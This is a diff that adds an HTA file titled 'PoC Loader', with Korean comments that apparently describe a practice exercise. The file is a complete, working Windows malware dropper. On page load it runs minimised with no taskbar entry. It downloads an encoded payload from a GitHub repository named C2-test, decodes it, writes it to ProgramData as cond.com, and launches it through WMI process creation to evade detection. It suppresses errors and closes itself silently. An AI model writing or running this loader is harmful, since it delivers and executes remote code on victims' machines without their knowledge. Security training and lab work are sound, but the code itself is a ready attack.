@@ -1,0 +1,69 @@
+<html>
+  <head>
+    <title>PoC Loader</title>
+    <hta:application
+      id="pocLoader"
+      showintaskbar="no"
+      sysmenu="no"
+      windowstate="minimize"
+    />
+    <script language="JScript">
+      function runPayload() {
+        try {
+          // 1. GitHub에서 Base64 텍스트 다운로드 (MSXML2.ServerXMLHTTP 이용)
+          var url =
+            "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/payload/encoded_encrypt.txt";
+          var xmlHttp = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
+
+          xmlHttp.open("GET", url, false);
+          xmlHttp.send();
+
+          if (xmlHttp.status !== 200) {
+            window.close();
+            return;
+          }
+
+          var base64Data = xmlHttp.responseText;
+
+          // 2. Base64 디코딩 레이어 (Microsoft.XMLDOM 이용)
+          var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
+          var el = xmlDoc.createElement("tmp");
+          el.dataType = "bin.base64";
+          el.text = base64Data;
+          var decodedBytes = el.nodeTypedValue;
+
+          // 3. ProgramData 경로에 cond.com 파일로 복사/생성 (ADODB.Stream 이용)
+          var shell = new ActiveXObject("WScript.Shell");
+          var programDataPath = shell.ExpandEnvironmentStrings(
+            "%SystemDrive%\\ProgramData",
+          );
+          var targetPath = programDataPath + "\\cond.com";
+
+          var stream = new ActiveXObject("ADODB.Stream");
+          stream.type = 1; // Binary
+          stream.open();
+          stream.write(decodedBytes);
+          stream.saveToFile(targetPath, 2); // 2: Overwrite
+          stream.close();
+
+          // 4. WMI(Win32_Process)를 통한 우회 실행
+          var wmiService = GetObject(
+            "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2",
+          );
+          var processInfo = wmiService.Get("Win32_Process");
+
+          // 프로세스 생성을 위한 인자 설정 (반환값 및 PID 수집용)
+          var processId = 0;
+          var result = processInfo.Create(targetPath, null, null, processId);
+        } catch (e) {
+          // 실습 중 에러 발생 시 디버깅을 위해 주석 해제하여 확인 가능
+          // alert("에러 발생: " + e.message);
+        } finally {
+          // 모든 작업이 끝나면 mshta 창을 화면에 남기지 않고 자동으로 닫음
+          window.close();
+        }
+      }
+    </script>
+  </head>
+  <body onload="runPayload()"></body>
+</html>
